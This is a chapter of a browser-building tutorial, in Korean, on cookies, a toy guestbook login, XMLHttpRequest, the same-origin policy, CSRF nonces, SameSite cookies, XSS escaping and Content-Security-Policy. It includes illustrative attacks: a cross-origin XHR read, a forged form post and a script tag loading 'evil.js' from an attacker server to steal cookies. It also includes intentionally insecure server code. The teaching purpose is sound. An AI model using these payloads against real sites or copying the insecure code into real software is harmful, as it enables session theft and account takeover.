우리 브라우저는 이제 다 자라서 (작은) 웹 애플리케이션을 실행합니다. 여기에 마지막 한 걸음, 즉 쿠키를 통한 사용자 식별을 더하면 온갖 종류의 개인화된 온라인 서비스를 실행할 수 있게 됩니다. 하지만 능력에는 책임이 따릅니다. 이제 우리 브라우저는 쿠키를 훔치려는 적으로부터 쿠키를 지켜야 합니다. 다행히 브라우저에는 쿠키 접근을 제어하고 오용을 막는 정교한 체계가 있습니다.

> **주의**
>
> 웹 보안은 브라우저 보안, 네트워크 보안, 애플리케이션 보안을 아우르는 방대한 주제입니다. 공격자가 사용자를 속여 스스로 보안 데이터를 넘기게 만들지 못하도록 사용자를 교육하는 일까지 포함됩니다. 이 장은 그 모든 것을 다룰 수 없습니다. 웹 애플리케이션이나 그 밖의 보안에 민감한 코드를 작성하고 있다면 이 책만으로는 충분하지 않습니다.

## 쿠키

지금까지 구현한 것만으로는 웹 서버가 두 HTTP 요청이 같은 사용자에게서 왔는지 서로 다른 사용자에게서 왔는지 알 방법이 없습니다. 우리 브라우저는 사실상 익명입니다.[^1] 즉 어디에도 "로그인"할 수 없다는 뜻인데, 로그인한 사용자의 요청과 로그인하지 않은 사용자의 요청을 구별할 수 없기 때문입니다.

웹은 이 문제를 쿠키로 해결합니다. 쿠키란(이름에는 아무 의미가 없으니 신경 쓰지 마세요) 웹 서버를 대신해 여러분의 브라우저가 저장해 두는 작은 정보 조각입니다. 쿠키는 여러분의 브라우저를 다른 어떤 브라우저와도 구별해 주며, 모든 웹 요청과 함께 전송되어 서버가 어떤 요청이 누구에게서 왔는지 구별할 수 있게 해 줍니다. 사실상 쿠키는 서버가 부여한, 탈중앙화된 브라우저의 신원인 셈입니다.

기술적인 세부 사항은 이렇습니다. HTTP 응답에는 `Set-Cookie` 헤더가 들어갈 수 있습니다. 이 헤더는 키–값 쌍을 담습니다. 예를 들어 다음 헤더는 `foo` 쿠키의 값을 `bar`로 설정합니다.

```
Set-Cookie: foo=bar
```

브라우저는 이 키–값 쌍을 기억했다가, 다음번에 같은 서버에 요청할 때(쿠키는 사이트별입니다) `Cookie` 헤더로 되돌려 보냅니다.

```
Cookie: foo=bar
```

서버는 쿠키를 여러 개 설정할 수 있고 만료 날짜 같은 매개변수도 설정할 수 있지만, 그림 1에 나온 이 `Set-Cookie` / `Cookie` 주고받기가 핵심 원리입니다.

![그림 1: 서버는 Set-Cookie 헤더로 브라우저에 쿠키를 부여하고, 그 뒤로 브라우저는 Cookie 헤더로 자신을 식별합니다.](security-cookies-2.gif)

*그림 1: 서버는 `Set-Cookie` 헤더로 브라우저에 쿠키를 부여하고, 그 뒤로 브라우저는 `Cookie` 헤더로 자신을 식별합니다.*

쿠키를 사용해 우리 방명록에 로그인 시스템을 만들어 봅시다. 각 사용자는 `token` 쿠키에 저장된 긴 난수로 식별됩니다.[^2] 서버는 `Cookie` 헤더에서 토큰을 뽑아내거나, 새 방문자를 위해 새 토큰을 생성합니다.

```python
import random

def handle_connection(conx):
    # ...
    if "cookie" in headers:
        token = headers["cookie"][len("token="):]
    else:
        token = str(random.random())[2:]
    # ...
```

물론 새 방문자에게는 새로 생성된 토큰을 기억하라고 알려 주어야 합니다.

```python
def handle_connection(conx):
    # ...
    if "cookie" not in headers:
        template = "Set-Cookie: token={}\r\n"
        response += template.format(token)
    # ...
```

첫 번째 코드 블록은 모든 요청 헤더가 파싱된 뒤, `do_request`에서 요청을 처리하기 전에 실행되고, 두 번째 코드 블록은 `do_request`가 반환된 뒤 서버가 HTTP 응답을 조립할 때 실행됩니다.

이 두 가지 코드 변경으로 방명록의 각 방문자는 이제 고유한 신원을 갖게 되었습니다. 이제 그 신원을 사용해 각 사용자에 관한 정보를 저장할 수 있습니다. 서버 쪽 `SESSIONS` 변수에 그렇게 해 봅시다.[^3]

```python
SESSIONS = {}

def handle_connection(conx):
    # ...
    session = SESSIONS.setdefault(token, {})
    status, body = do_request(session, method, url, headers, body)
    # ...
```

`SESSIONS`는 토큰을 세션 데이터 딕셔너리에 대응시킵니다. `setdefault` 메서드는 딕셔너리에서 키를 가져오면서 동시에 키가 없으면 기본값을 설정합니다. 이 세션 데이터를 `do_request`를 통해 `show_comments`나 `add_entry` 같은 개별 페이지로 넘기고 있습니다.

```python
def do_request(session, method, url, headers, body):
    if method == "GET" and url == "/":
        return "200 OK", show_comments(session)
    # ...
    elif method == "POST" and url == "/add":
        params = form_decode(body)
        add_entry(session, params)
        return "200 OK", show_comments(session)
    # ...
```

`add_entry`와 `show_comments`의 인자 목록도 이 새 인자를 받도록 수정해야 합니다. 이제 로그인 시스템을 만들 기반이 갖춰졌습니다.

### 더 알아보기

쿠키의 [원래 명세](https://curl.se/rfc/cookie_spec.html)는 이것을 "쿠키"라고 부를 "설득력 있는 이유는 없다"고 말하지만, 사실 프로그램 사이에서 주고받는 불투명한 식별자를 이 용어로 부르는 것은 훨씬 오래전으로 거슬러 올라가는 것 같습니다. [위키백과](https://en.wikipedia.org/wiki/Magic_cookie)는 그 기원을 적어도 1979년까지 추적하며, 쿠키는 웹에서 쓰이기 전에 [X11](https://en.wikipedia.org/wiki/X_Window_authorization#Cookie-based_access)의 인증에 사용되었습니다.

## 로그인 시스템

저는 사용자가 방명록에 글을 올리기 전에 로그인하도록 하고 싶습니다. 최소한 다음이 필요합니다.

- 사용자는 사용자 이름과 비밀번호로 로그인합니다.

- 서버는 로그인이 유효한지 확인합니다.

- 방명록 항목을 추가하려면 로그인되어 있어야 합니다.

- 서버는 어떤 방명록 항목을 누가 추가했는지 표시합니다.

코딩을 시작합시다. 사용자/비밀번호 쌍 두 개를 하드코딩하겠습니다.

```python
LOGINS = {
    "crashoverride": "0cool",
    "cerealkiller": "emmanuel"
}
```

사용자는 `/login`으로 가서 로그인합니다.

```python
def do_request(session, method, url, headers, body):
    # ...
    elif method == "GET" and url == "/login":
        return "200 OK", login_form(session)
    # ...
```

이 페이지는 사용자 이름 필드와 비밀번호 필드가 있는 폼을 보여 줍니다.[^4]

```python
def login_form(session):
    body = "<!doctype html>"
    body += "<form action=/ method=post>"
    body += "<p>Username: <input name=username></p>"
    body += "<p>Password: <input name=password type=password></p>"
    body += "<p><button>Log in</button></p>"
    body += "</form>"
    return body 
```

이 폼이 데이터를 `/` URL로 `POST`한다는 점에 주의하세요. 이 `POST` 요청은 비밀번호를 확인하고 로그인을 처리하는 새 함수에서 다루겠습니다.

```python
def do_request(session, method, url, headers, body):
    # ...
    elif method == "POST" and url == "/":
        params = form_decode(body)
        return do_login(session, params)
    # ...
```

이 `do_login` 함수는 비밀번호를 확인하고 사용자 이름을 세션 데이터에 저장함으로써 로그인시킵니다.[^5]

```python
def do_login(session, params):
    username = params.get("username")
    password = params.get("password")
    if username in LOGINS and LOGINS[username] == password:
        session["user"] = username
        return "200 OK", show_comments(session)
    else:
        out = "<!doctype html>"
        out += "<h1>Invalid password for {}</h1>".format(username)
        return "401 Unauthorized", out
```

(`user` 키를 포함한) 세션 데이터는 서버에 저장되므로 사용자가 직접 수정할 수 없다는 점에 주의하세요. 이는 좋은 일인데, 사용자가 로그인 폼에서 올바른 비밀번호를 제공했을 때만 세션 데이터에 `user` 키를 설정하고 싶기 때문입니다.

이제 `session` 데이터를 확인해 사용자가 로그인되어 있는지 알 수 있습니다. 로그인한 사용자에게만 댓글 폼을 보여 줍시다.

```python
def show_comments(session):
    # ...
    if "user" in session:
        out += "<h1>Hello, " + session["user"] + "</h1>"
        out += "<form action=add method=post>"
        out +=   "<p><input name=guest></p>"
        out +=   "<p><button>Sign the book!</button></p>"
        out += "</form>"
    else:
        out += "<a href=/login>Sign in to write in the guest book</a>"
    # ...
```

마찬가지로 `add_entry`도 댓글을 올리기 전에 사용자가 로그인되어 있는지 확인해야 합니다.

```python
def add_entry(session, params):
    if "user" not in session: return
    if 'guest' in params and len(params['guest']) <= 100:
        ENTRIES.append((params['guest'], session["user"]))
```

세션의 사용자 이름이 `ENTRIES`에 저장된다는 점에 주의하세요.[^6]

```python
ENTRIES = [
    ("No names. We are nameless!", "cerealkiller"),
    ("HACK THE PLANET!!!", "crashoverride"),
]
```

방명록 항목을 출력할 때 누가 작성했는지 보여 주겠습니다.

```python
def show_comments(session):
    # ...
    for entry, who in ENTRIES:
        out += "<p>" + entry + "\n"
        out += "<i>by " + who + "</i></p>"
    # ...
```

일반 웹 브라우저에서 시험해 보세요. 방명록 메인 페이지로 가서 로그인 링크를 클릭하고, 위의 사용자 이름/비밀번호 쌍 중 하나로 로그인한 다음 항목을 올릴 수 있어야 합니다.[^7] 물론 이 로그인 시스템에는 온갖 취약점이 있습니다.[^8] 하지만 이 책의 초점은 서버가 아니라 브라우저이므로, 모든 것이 잘 동작하는지 확인했다면 이제 우리 웹 브라우저로 돌아가 쿠키를 구현합시다.

## 쿠키 구현하기

우선 브라우저에 쿠키를 저장할 자리가 필요합니다. 그 자료 구조는 전통적으로 _쿠키 항아리(cookie jar)_ 라고 불립니다.[^9]

```python
COOKIE_JAR = {}
```

쿠키는 사이트별이므로, 우리 쿠키 항아리는 사이트를 쿠키에 대응시킵니다. 쿠키 항아리는 특정 탭에 국한되지 않고 전역이라는 점에 주의하세요. 즉 어떤 웹사이트에 로그인한 상태에서 두 번째 탭을 열면 그 탭에서도 로그인되어 있습니다.[^10]

브라우저가 페이지를 방문할 때는 그 사이트의 쿠키를 보내야 합니다.

```python
class URL:
    def request(self, payload=None):
        # ...
        if self.host in COOKIE_JAR:
            cookie = COOKIE_JAR[self.host]
            request += "Cookie: {}\r\n".format(cookie)
        # ...
```

대칭적으로, 브라우저는 `Set-Cookie` 헤더를 보면 쿠키 항아리를 갱신해야 합니다.[^11]

```python
class URL:
    def request(self, payload=None):
        # ...
        if "set-cookie" in response_headers:
            cookie = response_headers["set-cookie"]
            COOKIE_JAR[self.host] = cookie
        # ...
```

이제 여러분의 브라우저로 방명록에 로그인하고 글을 올릴 수 있을 것입니다. 게다가 방명록을 두 브라우저에서 동시에, 예를 들어 여러분의 브라우저와 실제 브라우저에서 열어 서로 다른 두 사용자로 로그인하고 글을 올릴 수도 있을 것입니다.

이제 우리 브라우저가 쿠키를 지원하고 그것을 로그인에 사용하므로, 쿠키 데이터가 악의적인 행위자로부터 안전한지 확인해야 합니다. 결국 쿠키는 브라우저의 신원이므로, 누군가 그것을 훔치면 서버는 그 사람을 여러분이라고 생각할 것입니다. 그런 일을 막아야 합니다.

### 더 알아보기

한때 [RFC 2965](https://datatracker.ietf.org/doc/html/rfc2965)에서 쿠키 명세를 "정리"하려는 시도가 있었습니다. 사람이 읽을 수 있는 쿠키 설명과 특정 포트로 제한되는 쿠키 같은 것을 포함해서요. 이를 위해 `Cookie2`와 `Set-Cookie2` 헤더를 도입해야 했는데, 새 헤더들은 인기를 얻지 못했습니다. 지금은 [폐기되었습니다](https://datatracker.ietf.org/doc/html/rfc6265).

## 교차 사이트 요청

쿠키는 사이트별이므로 한 서버에 다른 서버의 쿠키가 전송되어서는 안 됩니다.[^12] 하지만 공격자가 영리하다면 _서버_ 나 _브라우저_ 가 쿠키 값을 훔치는 것을 돕게 만들 수도 있습니다.

공격자가 여러분의 비공개 데이터를 훔치는 가장 쉬운 방법은 그냥 달라고 하는 것입니다. 물론 어떤 웹사이트가 다른 웹사이트의 쿠키를 요청하는 브라우저 API는 없습니다. 하지만 다른 웹사이트에 요청을 보내는 API는 _있습니다_. `XMLHttpRequest`라고 합니다.[^13]

`XMLHttpRequest`는 JavaScript에서 비동기 HTTP 요청을 보냅니다. 여기서는 보안 문제를 설명하기 위해서만 `XMLHttpRequest`를 사용하므로 최소한의 버전만 구현하겠습니다. 구체적으로는 _동기_ 요청만 지원하겠습니다.[^14] 이 최소한의 `XMLHttpRequest`를 사용하는 모습은 다음과 같습니다.

```
x = new XMLHttpRequest();
x.open("GET", url, false);
x.send();
// use x.responseText
```

`XMLHttpRequest` 객체와 메서드는 JavaScript에서 정의하겠습니다. `open` 메서드는 그냥 메서드와 URL을 저장합니다.[^15]

```javascript
function XMLHttpRequest() {}

XMLHttpRequest.prototype.open = function(method, url, is_async) {
    if (is_async) throw Error("Asynchronous XHR is not supported");
    this.method = method;
    this.url = url;
}
```

`send` 메서드는 내보낸 함수를 호출합니다.[^16]

```javascript
XMLHttpRequest.prototype.send = function(body) {
    this.responseText = call_python("XMLHttpRequest_send",
        this.method, this.url, body);
}
```

`XMLHttpRequest_send` 함수는 그냥 `request`를 호출합니다.[^17]

```python
class JSContext:
    def XMLHttpRequest_send(self, method, url, body):
        full_url = self.tab.url.resolve(url)
        headers, out = full_url.request(body)
        return out
```

`XMLHttpRequest`가 있으면 웹 페이지가 사용자 동작에 반응해 HTTP 요청을 할 수 있어서 웹사이트가 더 대화형이 됩니다(그림 2 참조). 이 API와 [`fetch`](https://developer.mozilla.org/en-US/docs/Web/API/fetch) 같은 더 새로운 유사물이, 웹사이트에서 페이지를 새로 고치지 않고도 글에 좋아요를 누르고, 마우스를 올렸을 때 미리보기를 보고, 폼을 제출할 수 있게 해 주는 것입니다.

### 더 알아보기

`XMLHttpRequest` 객체에는 HTTP 헤더를 제어하는 [`setRequestHeader`](https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest/setRequestHeader)와 [`getResponseHeader`](https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest/getResponseHeader) 메서드가 있습니다. 다만 이를 통해 스크립트가 쿠키 메커니즘이나 다른 보안 조치를 방해할 수 있으므로, 일부 [요청](https://developer.mozilla.org/en-US/docs/Glossary/Forbidden_header_name) 헤더와 [응답](https://developer.mozilla.org/en-US/docs/Glossary/Forbidden_response_header_name) 헤더는 JavaScript에서 접근할 수 없습니다.

## 동일 출처 정책

하지만 새로운 능력에는 새로운 책임이 따릅니다. `XMLHttpRequest`로 보낸 HTTP 요청에는 쿠키가 포함됩니다. 이는 의도된 것입니다. 무언가에 "좋아요"를 누르면 서버는 그 "좋아요"를 여러분의 계정과 연결해야 하니까요. 하지만 그 말은 `XMLHttpRequest`가 비공개 데이터에 접근할 수 있다는 뜻이기도 하고, 따라서 그것을 보호할 필요가 있습니다.

공격자가 우리 방명록 서버에서 여러분의 사용자 이름을 알아내고 싶어 한다고 상상해 봅시다. 로그인되어 있으면 방명록 페이지에 여러분의 사용자 이름이 ("아무개 님, 안녕하세요"라고) 표시되므로, 여러분의 쿠키로 방명록을 읽기만 해도 사용자 이름을 알아낼 수 있습니다.

`XMLHttpRequest`가 있으면 공격자의 웹사이트[^18]가 방명록 페이지를 요청할 수 있습니다.

```
x = new XMLHttpRequest();
x.open("GET", "http://localhost:8000/", false);
x.send();
user = x.responseText.split(" ")[2].split("<")[0];
```

여기서 문제는 한 서버의 웹 페이지 내용이 다른 서버가 제공한 웹사이트에서 실행되는 스크립트로 전송된다는 점입니다. 그 내용이 쿠키에서 파생된 것이므로, 이는 비공개 데이터를 유출합니다.

이런 문제를 막기 위해 브라우저에는 [_동일 출처 정책(same-origin policy)_](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy)이 있습니다. 이 정책에 따르면 `XMLHttpRequest` 같은 요청[^19]은 같은 "출처(origin)", 즉 스킴, 호스트 이름, 포트가 같은 웹 페이지로만 갈 수 있습니다.[^20] 이렇게 하면 웹사이트의 비공개 데이터가 그 웹사이트 안에 머물고 다른 서버의 공격자에게 유출될 수 없습니다.

우리 브라우저에 동일 출처 정책을 구현해 봅시다. 요청의 URL과 우리가 있는 페이지의 URL을 비교해야 합니다.

```python
class JSContext:
    def XMLHttpRequest_send(self, method, url, body):
        # ...
        if full_url.origin() != self.tab.url.origin():
            raise Exception("Cross-origin XHR request not allowed")
        # ...
```

`origin` 함수는 그냥 URL에서 경로를 떼어 내면 됩니다.

```python
class URL:
    def origin(self):
        return self.scheme + "://" + self.host + ":" + str(self.port)
```

이제 공격자는 방명록 웹 페이지를 읽을 수 없습니다. 그런데 쓸 수는 있을까요? 사실은…

### 더 알아보기

동일 출처 정책의 흥미로운 형태 하나가 이미지와 HTML `<canvas>` 요소에 관한 것입니다. [`drawImage` 메서드](https://developer.mozilla.org/en-US/docs/Web/API/CanvasRenderingContext2D/drawImage)는 이미지가 다른 출처에서 로드되었더라도 그것을 캔버스에 그릴 수 있게 해 줍니다. 하지만 그 이미지를 [`getImageData`](https://developer.mozilla.org/en-US/docs/Web/API/CanvasRenderingContext2D/getImageData)나 관련 메서드로 다시 읽지 못하도록, 교차 출처 데이터를 캔버스에 쓰면 그 캔버스가 [오염되어(tainted)](https://developer.mozilla.org/en-US/docs/Web/HTML/CORS_enabled_image) 읽기 메서드가 차단됩니다.

## 교차 사이트 요청 위조

동일 출처 정책은 교차 출처 `XMLHttpRequest` 호출을 막습니다. 하지만 동일 출처 정책은 링크를 클릭하거나 폼을 채우는 것 같은 보통의 브라우저 동작에는 적용되지 않습니다. 이 때문에 _교차 사이트 요청 위조_, 흔히 CSRF라고 줄여 부르는 공격이 가능해집니다.

교차 사이트 요청 위조에서 공격자는 `XMLHttpRequest` 대신 방명록으로 제출하는 폼을 사용합니다.

```
<form action="http://localhost:8000/add" method=post>
  <p><input name=guest></p>
  <p><button>Sign the book!</button></p>
</form>
```

이 폼이 악당의 웹사이트에 있더라도, 폼을 제출하면 브라우저는 _방명록_ 으로 HTTP 요청을 보냅니다. 그 말은 방명록 쿠키를 함께 보낸다는 뜻이고, 따라서 로그인된 상태가 되며, 그래서 방명록 코드는 글 올리기를 허용합니다. 그런데 사용자는 폼이 어떤 서버로 제출되는지 알 방법이 없으므로(공격자의 웹 페이지가 그것을 거짓으로 표시했을 수 있습니다), 의도하지 않은 것을 올렸을 수도 있습니다.[^21]

물론 공격자는 응답을 읽을 수 없으므로 이것이 공격자에게 비공개 데이터를 유출하지는 않습니다. 하지만 공격자가 사용자로서 _행동할_ 수는 있게 해 줍니다! 이런 식으로 댓글을 올리는 것은 그리 무섭지 않지만(그래도 수상한 광고주들은 그것에 돈을 낼 것입니다!) 은행 거래를 올리는 것은 무섭습니다. 그리고 웹사이트에 비밀번호 변경 폼이 있다면 계정을 통째로 빼앗는 방법까지 있을 수 있습니다.

안타깝게도 폼 제출에 동일 출처 정책을 그냥 적용할 수는 없습니다.[^22] 그렇다면 이 공격을 어떻게 막을까요?

우선 서버가 할 수 있는 일이 있습니다. 흔한 조언은 서버가 제공하는 모든 폼에 고유한 신원을 부여하고, 모든 POST 요청이 그중 하나에서 왔는지 확인하라는 것입니다. 그 방법은 _논스(nonce)_ 라고 불리는 비밀 값을 폼에 심어 두고, 올바른 비밀 값과 함께 오지 않은 폼 제출을 거부하는 것입니다.[^23] 논스는 서버에서만 얻을 수 있고 사용자 세션에 묶여 있으므로,[^24] 공격자는 그것을 자신의 폼에 심을 수 없습니다.

이 수정을 구현하려면, 폼이 요청될 때 논스를 생성해 사용자 세션에 저장하세요.[^25]

```python
def show_comments(session):
    # ...
    if "user" in session:
        nonce = str(random.random())[2:]
        session["nonce"] = nonce
        # ...
        out +=   "<input name=nonce type=hidden value=" + nonce + ">"
```

폼이 제출되면 서버는 올바른 논스가 함께 제출되었는지 확인합니다.[^26]

```python
def add_entry(session, params):
    if "nonce" not in session or "nonce" not in params: return
    if session["nonce"] != params["nonce"]: return
    # ...
```

이제 이 폼은 우리 웹사이트에서가 아니면 제출할 수 없습니다. 애플리케이션의 각 폼마다 이 논스 수정을 반복하면 CSRF 공격으로부터 안전해집니다. 하지만 서버 쪽 해법은 취약합니다(폼 하나를 깜빡하면 어떻게 될까요?). 그리고 세상의 모든 웹사이트가 이것을 제대로 하리라고 기대하는 것은 헛된 꿈입니다. 브라우저가 안전장치가 될 백업을 제공하는 편이 낫습니다.

### 더 알아보기

교차 사이트 요청 위조와 정신적으로 비슷한 특이한 공격 하나가 [클릭재킹(click-jacking)](https://owasp.org/www-community/attacks/Clickjacking)입니다. 이 공격에서는 투명한 `iframe` 안의 외부 사이트가 공격자의 사이트 위에 배치됩니다. 사용자는 자신이 한 사이트를 클릭하며 돌아다니고 있다고 생각하지만, 실제로는 다른 사이트에서 동작을 수행하는 것입니다. 요즘 사이트들은 `Content-Security-Policy`의 [`frame-ancestors` 지시어](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors)나 더 오래된 [`X-Frame-Options` 헤더](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options)로 이를 막을 수 있습니다.

## SameSite 쿠키

폼 제출에 대한 그 안전장치 해법이 `SameSite` 쿠키입니다. 아이디어는, 서버가 자신의 쿠키를 `SameSite`로 표시하면 브라우저가 교차 사이트 폼 제출에서 그 쿠키를 보내지 않는다는 것입니다.[^27]

쿠키는 `Set-Cookie` 헤더에서 다음과 같이 `SameSite`로 표시합니다.

```
Set-Cookie: foo=bar; SameSite=Lax
```

`SameSite` 속성은 `Lax`, `Strict`, `None` 값을 가질 수 있는데, 이 글을 쓰는 시점에 브라우저마다 기본값이 다르고 앞으로의 계획도 다릅니다. 우리 브라우저는 `Lax`와 `None`만 구현하고 기본값은 `None`으로 하겠습니다. `SameSite`가 `Lax`로 설정되면 그 쿠키는 교차 사이트 `POST` 요청에는 전송되지 않지만, 동일 사이트 `POST` 요청이나 교차 사이트 `GET` 요청에는 전송됩니다.[^28]

먼저 `COOKIE_JAR`이 쿠키/매개변수 쌍을 저장하도록 수정하고, `Set-Cookie` 헤더에서 그 매개변수들을 파싱해 냅시다.

```python
def request(self, payload=None):
    if "set-cookie" in response_headers:
        cookie = response_headers["set-cookie"]
        params = {}
        if ";" in cookie:
            cookie, rest = cookie.split(";", 1)
            for param in rest.split(";"):
                if '=' in param:
                    param, value = param.split("=", 1)
                else:
                    value = "true"
                params[param.strip().casefold()] = value.casefold()
        COOKIE_JAR[self.host] = (cookie, params)
```

HTTP 요청에서 쿠키를 보낼 때 브라우저는 매개변수가 아니라 쿠키 값만 보냅니다.

```python
def request(self, payload=None):
    if self.host in COOKIE_JAR:
        cookie, params = COOKIE_JAR[self.host]
        request += "Cookie: {}\r\n".format(cookie)
```

이렇게 쿠키의 `SameSite` 매개변수를 저장합니다. 하지만 실제로 그것을 사용하려면 HTTP 요청이 어떤 사이트에서 이루어지고 있는지 알아야 합니다. 그것을 추적하기 위해 `request`에 새로운 `referrer` 매개변수를 추가합시다.[^29]

```python
class URL:
    def request(self, referrer, payload=None):
        # ...
```

우리 브라우저는 `request`를 세 곳에서 호출하는데, 각 경우에 최상위 URL을 보내야 합니다. `load`의 맨 위에서 페이지에 대한 최초 요청을 합니다. 다음과 같이 수정하세요.

```python
class Tab:
    def load(self, url, payload=None):
        headers, body = url.request(self.url, payload)
        # ...
```

여기서 `url`은 방문할 새 URL이고, `self.url`은 그 요청이 시작된 페이지의 URL입니다. 이 줄이 `load`의 맨 위, `self.url`이 바뀌기 전에 오도록 하세요!

그다음 브라우저는 `request` 호출을 더 해서 스타일과 스크립트를 로드합니다.

```python
class Tab:
    def load(self, url, payload=None):
        # ...
        for script in scripts:
            # ...
            try:
                header, body = script_url.request(url)
            except:
                continue
            # ...
        # ...
        for link in links:
            # ...
            try:
                header, body = style_url.request(url)
            except:
                continue
            # ...
        # ...
```

이 요청들의 경우 최상위 URL은 새로 로드되고 있는 URL입니다. 이 특정 스타일과 스크립트를 요청하게 만든 것이 바로 그 새 페이지이므로, 그 페이지가 어떤 자원이 동일 사이트에 있는지를 정의하기 때문입니다.

마찬가지로 `XMLHttpRequest`가 유발한 요청은 탭의 URL을 최상위 URL로 사용합니다.

```python
class JSContext:
    def XMLHttpRequest_send(self, method, url, body):
        # ...
        headers, out = full_url.request(self.tab.url, body)
        # ...
```

이제 `request` 함수는 `SameSite` 쿠키를 보내기 전에 `referrer` 인자를 확인할 수 있습니다. `SameSite` 쿠키는 `GET` 요청이거나 새 URL과 최상위 URL의 호스트 이름이 같을 때만 전송된다는 점을 기억하세요.[^30]

```python
def request(self, referrer, payload=None):
    if self.host in COOKIE_JAR:
        # ...
        cookie, params = COOKIE_JAR[self.host]
        allow_cookie = True
        if referrer and params.get("samesite", "none") == "lax":
            if method != "GET":
                allow_cookie = self.host == referrer.host
        if allow_cookie:
            request += "Cookie: {}\r\n".format(cookie)
        # ...
```

`referrer`가 설정되어 있는지 확인한다는 점에 주의하세요. 새 탭에서 첫 웹 페이지를 로드할 때는 설정되어 있지 않습니다.

이제 우리 방명록은 자신의 쿠키를 `SameSite`로 표시할 수 있습니다.

```python
def handle_connection(conx):
    if "cookie" not in headers:
        template = "Set-Cookie: token={}; SameSite=Lax\r\n"
        response += template.format(token)
```

`SameSite`는 일종의 "심층 방어"를 제공합니다. 어딘가에서 논스를 깜빡했더라도 여전히 CSRF 공격으로부터 안전하도록 해 주는 안전장치죠. 하지만 앞서 추가한 논스를 제거하지는 마세요! 논스는 오래된 브라우저에 중요하고, 도메인이 여러 개인 경우 같은 상황에서 더 유연합니다.

### 더 알아보기

웹은 처음부터 보안을 염두에 두고 설계되지 않았고, 그 때문에 나중에 몇몇 [어색한 땜질](https://jakearchibald.com/2021/cors/)이 붙었습니다. 이런 땜질이 보기 흉할 수는 있지만 하위 호환성에 대한 헌신은 웹의 강점이며, 적어도 새 API들은 더 일관된 정책을 중심으로 설계될 수 있습니다.

그런 맥락에서, `SameSite`에 대한 완전한 명세가 있음에도 실제 브라우저들은 여전히 이 기능의 서로 다른 부분집합을 지원하거나 서로 다른 기본값을 씁니다. 예를 들어 Chrome은 기본값이 `Lax`이지만 Firefox와 Safari는 그렇지 않습니다. 마찬가지로 Chrome은 "사이트"의 정의에 스킴(`https` 또는 `http`)을 포함하지만[^31] 다른 브라우저는 그러지 않을 수 있습니다. 이런 상황의 주된 이유는 기존 웹사이트와의 하위 호환성을 유지해야 하기 때문입니다.

## 교차 사이트 스크립팅

이제 다른 웹사이트가 우리 브라우저의 쿠키를 오용해 비공개 데이터를 읽거나 쓸 수 없습니다. 안전해 보이네요! 그런데 _우리 자신의_ 웹사이트는 어떨까요? 쿠키에 JavaScript에서 접근할 수 있으므로, 원칙적으로 우리 브라우저에서 실행되는 어떤 스크립트든 쿠키 값을 읽을 수 있습니다. 별문제 아닌 것처럼 보일 수 있습니다. 우리 브라우저는 `comment.js`만 실행하지 않나요? 하지만 사실은…

웹 서비스는 _오용당하는_ 것으로부터 자신을 방어해야 합니다. 방명록 항목을 출력하는 우리 방명록 코드를 생각해 봅시다.

```python
out += "<p>" + entry + "\n"
out += "<i>by " + who + "</i></p>"
```

`entry`는 무엇이든 될 수 있다는 점에 주의하세요. 사용자가 우리 댓글 폼에 집어넣을 수 있는 무엇이든지요. 여기에는 커스텀 `<script>` 태그 같은 HTML 태그도 포함됩니다! 그러니 악의적인 사용자는 이런 댓글을 올릴 수 있습니다.

```
Hi! <script src="http://my-server/evil.js"></script>
```

그러면 서버는 다음 HTML을 출력합니다.

```
<p>Hi! <script src="http://my-server/evil.js"></script>
<i>by crashoverride</i></p>
```

그러면 모든 사용자의 브라우저가 `evil.js` 스크립트를 내려받아 실행하고, 그 스크립트는 쿠키를 공격자에게 보낼[^32] 수 있습니다. 그러면 공격자는 다른 사용자를 사칭해 그들 이름으로 글을 올리거나 그들이 가진 다른 어떤 권한이든 오용할 수 있습니다.

여기서 핵심 문제는 사용자 댓글이 데이터여야 하는데 브라우저가 그것을 코드로 해석한다는 점입니다. 웹 애플리케이션에서 이런 종류의 공격은 보통 _교차 사이트 스크립팅_(흔히 "XSS"라고 씁니다)이라고 부르지만, 데이터를 코드로 오해하는 것은 온갖 종류의 프로그램에서 흔한 보안 문제입니다.

표준적인 해결책은 데이터를 코드로 해석될 수 없도록 인코딩하는 것입니다. 예를 들어 HTML에서는 미만 기호를 표시하기 위해 `&lt;`라고 쓸 수 있습니다.[^33] Python에는 이런 인코딩을 위한 `html` 모듈이 있습니다.

```python
import html

def show_comments(session):
    # ...
    out += "<p>" + html.escape(entry) + "\n"
    out += "<i>by " + html.escape(who) + "</i></p>"
    # ...
```

이는 좋은 해결책이며, 모든 애플리케이션은 이 이스케이프를 신중히 해야 합니다. 하지만 어딘가에서 텍스트 인코딩을 깜빡한다면 그것이 곧 보안 버그입니다. 그래서 브라우저는 추가 방어층을 제공합니다.

### 더 알아보기

6장에서 구현한 CSS 파서는 매우 관대하기 때문에, 어떤 HTML 페이지는 유효한 CSS로도 파싱됩니다. 이는 공격으로 이어집니다. 외부 HTML 페이지를 스타일 시트로 포함시키고 그것이 적용하는 스타일을 관찰하는 것이죠. [비슷한 공격](https://owasp.org/www-pdf-archive/OWASPLondon20161124_JSON_Hijacking_Gareth_Heyes.pdf)으로 외부 JSON 파일을 스크립트로 포함시키는 것도 있습니다. `Content-Type` 헤더를 설정하면 브라우저의 [교차 출처 읽기 차단(Cross-Origin Read Blocking)](https://chromium.googlesource.com/chromium/src/+/refs/heads/main/services/network/cross_origin_read_blocking_explainer.md) 정책 덕분에 이런 종류의 공격을 막을 수 있습니다.

## 콘텐츠 보안 정책

그런 방어층 하나가 `Content-Security-Policy` 헤더입니다. 이 헤더의 완전한 명세는 꽤 복잡하지만, 가장 단순한 경우 이 헤더는 `default-src` 키워드 뒤에 공백으로 구분된 서버 목록이 오도록 설정됩니다.

```
Content-Security-Policy: default-src http://example.org
```

이 헤더는 브라우저에게 나열된 출처를 제외하고는 (CSS, JavaScript, 이미지 등을 포함한) 어떤 자원도 로드하지 말라고 요청합니다. 우리 방명록이 `Content-Security-Policy`를 사용한다면, 공격자가 어떻게든 페이지에 `<script>`를 추가하는 데 성공하더라도 브라우저는 그 스크립트를 로드하고 실행하기를 거부할 것입니다.

이 헤더 지원을 구현해 봅시다. 먼저 `request`가 응답 헤더를 반환하게 해야 합니다.

```python
class URL:
    def request(self, referrer, payload=None):
        # ...
        return response_headers, content
```

